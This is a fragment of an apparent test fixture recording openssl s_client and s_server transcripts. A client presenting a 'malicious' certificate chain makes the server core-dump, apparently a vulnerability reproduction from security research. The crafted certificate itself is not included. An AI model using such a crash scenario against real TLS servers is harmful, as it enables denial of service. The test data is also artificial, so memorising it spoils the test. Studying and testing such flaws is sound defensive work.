          "SSL_connect:before SSL initialization\r\n" +
          "SSL_connect:SSLv3/TLS write client hello\r\n" +
          "SSL_connect:SSLv3/TLS write client hello\r\n" +
          "SSL_connect:SSLv3/TLS read server hello\r\n" +
          "Can't use SSL_get_servername\r\n" +
          "SSL_connect:TLSv1.3 read encrypted extensions\r\n" +
          "SSL_connect:SSLv3/TLS read server certificate request\r\n" +
          "depth=1 C = US, ST = NY, L = NYC, O = DataDog, OU = SecurityResearch, CN = RootCA\r\n" +
          "verify error:num=19:self signed certificate in certificate chain\r\n" +
          "verify return:1\r\n" +
          "depth=1 C = US, ST = NY, L = NYC, O = DataDog, OU = SecurityResearch, CN = RootCA\r\n" +
          "verify return:1\r\n" +
          "depth=0 C = US, ST = NY, O = DataDog, OU = SecurityResearch, CN = server\r\n" +
          "verify return:1\r\n" +
          "SSL_connect:SSLv3/TLS read server certificate\r\n" +
          "SSL_connect:TLSv1.3 read server certificate verify\r\n" +
          "SSL_connect:SSLv3/TLS read finished\r\n" +
          "SSL_connect:SSLv3/TLS write change cipher spec\r\n" +
          "SSL_connect:SSLv3/TLS write client certificate\r\n" +
          "SSL_connect:SSLv3/TLS write certificate verify\r\n" +
          "SSL_connect:SSLv3/TLS write finished\r\n" +
          "---\r\n" +
          "Certificate chain\r\n" +
          " 0 s:C = US, ST = NY, O = DataDog, OU = SecurityResearch, CN = server\r\n" +
          "   i:C = US, ST = NY, L = NYC, O = DataDog, OU = SecurityResearch, CN = RootCA\r\n" +
          " 1 s:C = US, ST = NY, L = NYC, O = DataDog, OU = SecurityResearch, CN = RootCA\r\n" +
          "   i:C = US, ST = NY, L = NYC, O = DataDog, OU = SecurityResearch, CN = RootCA\r\n" +
          "---\r\n" +
          "Server certificate\r\n" +
          "-----BEGIN CERTIFICATE-----\r\n" +
          "MIIESjCCAzKgAwIBAgIBATANBgkqhkiG9w0BAQsFADBmMQswCQYDVQQGEwJVUzEL\r\n" +
          "MAkGA1UECAwCTlkxDDAKBgNVBAcMA05ZQzEQMA4GA1UECgwHRGF0YURvZzEZMBcG\r\n" +
          "A1UECwwQU2VjdXJpdHlSZXNlYXJjaDEPMA0GA1UEAwwGUm9vdENBMB4XDTIyMTEx\r\n" +
          "MTE2NDU0MFoXDTI3MDUxOTE2NDU0MFowWDELMAkGA1UEBhMCVVMxCzAJBgNVBAgM\r\n" +
          "Ak5ZMRAwDgYDVQQKDAdEYXRhRG9nMRkwFwYDVQQLDBBTZWN1cml0eVJlc2VhcmNo\r\n" +
          "MQ8wDQYDVQQDDAZzZXJ2ZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB\r\n" +
          "AQCKQYWsjzdTriGdFJPotaVvDCvKj4M7x0EoK6a+kUw8m7ZUx9dY8PTLMEJQCoRD\r\n" +
          "A3AHG392VxlOpjsBDP1pbBlWlpVd3gtOWCwzD8Ynr7LvnWopnjCtKxzwOqHB30FB\r\n" +
          "1+QjJgfK6q1Op810W/z8TWyYgxJdYbw9jiPz33qigTRinW4m4LqQW1jlnIzx/shG\r\n" +
          "zVJoAgQbVWr2QvBjkpYHnknIWog67VjAdZIa5YI6uyqqui/hGhCMoo1Rllp/asZ+\r\n" +
          "Ty/eSFoGo+DnCeAOkgAzQa6Uq1xsE7QzMeU1hicskqgdMajEvWrqIhJ18N5EvB48\r\n" +
          "KD9e27ThKKqfHW5CyaaB85KJAgMBAAGjggEPMIIBCzAMBgNVHRMBAf8EAjAAMB0G\r\n" +
          "A1UdDgQWBBTyKzovS+qCMzBd4yU5E8j0/nzCuTCBowYDVR0jBIGbMIGYgBTs1/q5\r\n" +
          "Gj+N3mk/mHeLyrTkwlu9eKFqpGgwZjELMAkGA1UEBhMCVVMxCzAJBgNVBAgMAk5Z\r\n" +
          "MQwwCgYDVQQHDANOWUMxEDAOBgNVBAoMB0RhdGFEb2cxGTAXBgNVBAsMEFNlY3Vy\r\n" +
          "aXR5UmVzZWFyY2gxDzANBgNVBAMMBlJvb3RDQYIUW/Ka5OiVXoUJpWWBqC/bnts/\r\n" +
          "Th0wEQYJYIZIAYb4QgEBBAQDAgZAMA4GA1UdDwEB/wQEAwIFoDATBgNVHSUEDDAK\r\n" +
          "BggrBgEFBQcDATANBgkqhkiG9w0BAQsFAAOCAQEAi3RVc7s2JIWX9rwXI+fW0C80\r\n" +
          "Z7kfT7Dn6S1WZdYAELnmlfSiZ8BIfXqE3ZN60lYdUfq0o5YbSyXmv5wRXb5ZLFOG\r\n" +
          "yZ9nFc+RfU0RZhaQx9rW01DAcJPezufZ8d4zr0s62e4V9k2FKGPaKGygSBnSK385\r\n" +
          "M6c0ejTXyISDUYBEoMNvBnE/kNSal30f9quzqRjtD/9xpkDBW3q0osQ1/vsAyxiq\r\n" +
          "csVPmyCcZzdgihK/eHEHPQnr9hZqapzQCCZScGSUWaV22EP4nuqSf6LqlrFTtFWL\r\n" +
          "P43R0H7LuJK34ts/o8HwPPCRLiZ95r/zTH2+n/nvkgBnAWn8uwnykEr4oKu3hA==\r\n" +
          "-----END CERTIFICATE-----\r\n" +
          "subject=C = US, ST = NY, O = DataDog, OU = SecurityResearch, CN = server\r\n" +
          "\r\n" +
          "issuer=C = US, ST = NY, L = NYC, O = DataDog, OU = SecurityResearch, CN = RootCA\r\n" +
          "\r\n" +
          "---\r\n" +
          "Acceptable client certificate CA names\r\n" +
          "C = US, ST = NY, L = NYC, O = DataDog, OU = SecurityResearch, CN = RootCA\r\n" +
          "Requested Signature Algorithms: ECDSA+SHA256:ECDSA+SHA384:ECDSA+SHA512:Ed25519:Ed448:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA+SHA256:RSA+SHA384:RSA+SHA512:ECDSA+SHA224:RSA+SHA224\r\n" +
          "Shared Requested Signature Algorithms: ECDSA+SHA256:ECDSA+SHA384:ECDSA+SHA512:Ed25519:Ed448:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA+SHA256:RSA+SHA384:RSA+SHA512\r\n" +
          "Peer signing digest: SHA256\r\n" +
          "Peer signature type: RSA-PSS\r\n" +
          "Server Temp Key: X25519, 253 bits\r\n" +
          "---\r\n" +
          "SSL handshake has read 2787 bytes and written 3277 bytes\r\n" +
          "Verification error: self signed certificate in certificate chain\r\n" +
          "---\r\n" +
          "New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384\r\n" +
          "Server public key is 2048 bit\r\n" +
          "Secure Renegotiation IS NOT supported\r\n" +
          "Compression: NONE\r\n" +
          "Expansion: NONE\r\n" +
          "No ALPN negotiated\r\n" +
          "Early data was not sent\r\n" +
          "Verify return code: 19 (self signed certificate in certificate chain)\r\n" +
          "---\r\n" +
          "read:errno=0\r\n" +
          "SSL3 alert write:warning:close notify\r\n",
        stderr:
          "Warning: Permanently added '[127.0.0.2]:2222' (ED25519) to the list of known hosts.\r\n" +
          "ControlSocket /home/alois/.ssh/controlmasters/root@127.0.0.2:2222 already exists, disabling multiplexing\r\n" +
          "Connection to 127.0.0.2 closed.\r\n",
        stdin: `openssl, s_client, -connect, 127.0.0.1:${port}, -key, certs/client.key.pem, -cert, certs/client.cert.pem, -CAfile, certs/malicious-client-cacert.pem, -state`,
      },
      server: {
        stdin: `/usr/local64/bin/openssl, s_server, -accept, ${port}, -CAfile, certs/cacert.pem, -cert, certs/server.cert.pem, -naccept, 1, -key, certs/server.key.pem, -state, -verify, 1`,
        stdout:
          "verify depth is 1\r\n" +
          "Using default temp DH parameters\r\n" +
          "ACCEPT\r\n" +
          "SSL_accept:before SSL initialization\r\n" +
          "SSL_accept:before SSL initialization\r\n" +
          "SSL_accept:SSLv3/TLS read client hello\r\n" +
          "SSL_accept:SSLv3/TLS write server hello\r\n" +
          "SSL_accept:SSLv3/TLS write change cipher spec\r\n" +
          "SSL_accept:TLSv1.3 write encrypted extensions\r\n" +
          "SSL_accept:SSLv3/TLS write certificate request\r\n" +
          "SSL_accept:SSLv3/TLS write certificate\r\n" +
          "SSL_accept:TLSv1.3 write server certificate verify\r\n" +
          "SSL_accept:SSLv3/TLS write finished\r\n" +
          "SSL_accept:TLSv1.3 early data\r\n" +
          "SSL_accept:TLSv1.3 early data\r\n" +
          "depth=1 C = FR, ST = IdF, L = Paris, O = DataDog, OU = SecurityResearch, CN = KraftCert\r\n" +
          "verify error:num=19:self-signed certificate in certificate chain\r\n" +
          "verify return:1\r\n" +
          "depth=1 C = FR, ST = IdF, L = Paris, O = DataDog, OU = SecurityResearch, CN = KraftCert\r\n" +
          "verify return:1\r\n" +
          "depth=0 C = FR, ST = IdF, O = DataDog, OU = SecurityResearch, CN = MaliciousClientCert\r\n" +
          "verify return:1\r\n" +
          "In-address space security exception (core dumped)\r\n",
        stderr:
          "Warning: Permanently added '[127.0.0.2]:2222' (ED25519) to the list of known hosts.\r\n" +
          "ControlSocket /home/alois/.ssh/controlmasters/root@127.0.0.2:2222 already exists, disabling multiplexing\r\n" +
          "Connection to 127.0.0.2 closed.\r\n",
        exitCode: 162,
      },
    };
  }
}
